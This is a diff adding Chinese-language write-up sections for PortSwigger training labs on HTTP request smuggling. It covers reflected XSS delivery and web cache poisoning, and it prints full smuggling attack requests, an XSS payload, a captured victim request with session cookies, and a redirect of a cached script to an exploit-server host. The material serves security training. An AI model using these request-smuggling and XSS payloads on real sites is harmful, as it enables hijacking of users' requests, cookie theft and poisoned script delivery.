@@ -1095,6 +1095,283 @@ GET / HTTP/1.1 Host: 0a7000ff04e7fea280e58580009c00f1.web-security-academy.net s
 
 把這些 cookie 塞到自己的瀏覽器，訪問 /my-account，即可通關～
 
+## Lab: Exploiting HTTP request smuggling to deliver reflected XSS
+
+| Dimension | Description                                                                                                             |
+| --------- | ----------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-exploit-reflected-xss |
+| Lab       | https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss                             |
+
+評論頁有 reflected XSS，PoC
+
+```
+GET /post?postId=1 HTTP/1.1
+Host: 0acd00a80432e9318004c182008a0050.web-security-academy.net
+User-Agent: "><script>alert(1)</script><a href="
+
+
+```
+
+Response HTML
+
+```html
+<input required type="hidden" name="userAgent" value="" />
+<script>
+  alert(1);
+</script>
+<a href=""></a>
+```
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0acd00a80432e9318004c182008a0050.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 96
+
+0
+
+GET /post?postId=1 HTTP/1.1
+User-Agent: "><script>alert(1)</script><a href="
+Start-Line:
+```
+
+下一個使用者正常訪問，就會中招～
+
+<!-- https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect -->
+<!-- todo-yus 54 => 59 -->
+
+## Lab: Exploiting HTTP request smuggling to perform web cache poisoning
+
+| Dimension | Description                                                                                                                   |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-perform-web-cache-poisoning |
+| Lab       | https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning                             |
+
+### Step0: 尋找 30x redirect 的 API Endpoint
+
+找到留言功能
+
+```ts
+fetch(
+  "https://0a2100b003e582bf8026678c00b10093.web-security-academy.net/post/comment",
+  {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
+    },
+    body: "csrf=7l5NCd3IrxwNh4D2CBiI4gShmiBLg5SB&postId=4&comment=123&name=123&email=123%40123",
+    method: "POST",
+    mode: "cors",
+    credentials: "include",
+  },
+);
+```
+
+回傳 302 + `Location: /post/comment/confirmation?postId=4`
+
+### Step1: 透過留言功能，得知 victim's request
+
+先用 [Lab: Exploiting HTTP request smuggling to capture other users' requests](#lab-exploiting-http-request-smuggling-to-capture-other-users-requests) 的技巧，確認 victim 會發送的請求
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 311
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: exploit-0a85007003ab82fb803c66a7016b00f2.exploit-server.net
+Cookie: session=G4Xeh9oUYZsf4jPmBOCpcsCFslb3Bhn2
+Content-Length: 938
+
+csrf=7l5NCd3IrxwNh4D2CBiI4gShmiBLg5SB&postId=2&&name=victim3&email=victim%40123&comment=
+```
+
+透過留言，得知 victim's request
+
+```
+GET /post?postId=1 HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: none
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-US,en;q=0.9 priority: u=0, i
+cookie: victim-fingerprint=kRwHpEaoSoFPHR5buuw9U74vdv842gjA; secret=htCvrd1solam3fLdtcQd5DClazOiGBPA; session=cPht5UIdA2FVSJgV74nM6caPmxnbPp3D
+Content-Length: 0
+
+
+```
+
+### Step2: 確認快取資源
+
+這題有快取的資源是 `/resources/js/tracking.js`
+
+### Step3: exploit open redirect using attacker host
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 311
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: exploit-0a85007003ab82fb803c66a7016b00f2.exploit-server.net
+Cookie: session=G4Xeh9oUYZsf4jPmBOCpcsCFslb3Bhn2
+Content-Length: 195
+
+csrf=7l5NCd3IrxwNh4D2CBiI4gShmiBLg5SB&postId=2&&name=victim3&email=victim%40123&comment=
+```
+
+normal request
+
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+
+
+```
+
+normal request's response
+
+```
+HTTP/1.1 302 Found
+Location: /post/comment/confirmation?postId=2
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Connection: close
+Content-Length: 0
+
+
+```
+
+有成功讓 `/resources/js/tracking.js` 指到 `/post/comment/confirmation`，但 Host 還是沒變
+
+### Step4: exploit open redirect using protocol-relative URL
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 370
+
+0
+
+POST //exploit-0a85007003ab82fb803c66a7016b00f2.exploit-server.net/post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+Cookie: session=G4Xeh9oUYZsf4jPmBOCpcsCFslb3Bhn2
+Content-Length: 195
+
+csrf=7l5NCd3IrxwNh4D2CBiI4gShmiBLg5SB&postId=2&&name=victim3&email=victim%40123&comment=
+```
+
+normal request
+
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+
+
+```
+
+normal request's response
+
+```
+HTTP/1.1 404 Not Found
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Connection: close
+Content-Length: 11
+
+"Not Found"
+```
+
+這個 "Not Found" 應該是 .web-security-academy.net 回應的，因為 exploit-server 的 404 是
+
+```
+HTTP/1.1 404 Not Found
+Content-Type: application/json; charset=utf-8
+Server: Academy Exploit Server
+Keep-Alive: timeout=15
+Content-Length: 45
+
+"Resource not found - Academy Exploit Server"
+```
+
+### Step5: exploit open redirect using attacker host + another endpoint
+
+後來發現 30x redirect 的目標是 `/post/next?postId=4` => 302 + `Location: https://0a2100b003e582bf8026678c00b10093.web-security-academy.net/post?postId=5`
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 140
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: exploit-0a85007003ab82fb803c66a7016b00f2.exploit-server.net
+Content-Length: 118
+
+Only11Bytes
+```
+
+normal request
+
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: 0a2100b003e582bf8026678c00b10093.web-security-academy.net
+
+
+```
+
+normal request's response
+
+```
+HTTP/1.1 302 Found
+Location: https://exploit-0a85007003ab82fb803c66a7016b00f2.exploit-server.net/post?postId=4
+Set-Cookie: session=CbPrjiZ8Q5qklOvlgVZY2W464GC2w1nm; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+Connection: close
+Content-Length: 0
+
+
+```
+
+成功解題～不過這題我有參考答案，不然一直卡在用錯誤的留言功能來當作 30x redirect 的 smuggle request
+
 ## 參考資料
 
 - https://portswigger.net/web-security/request-smuggling
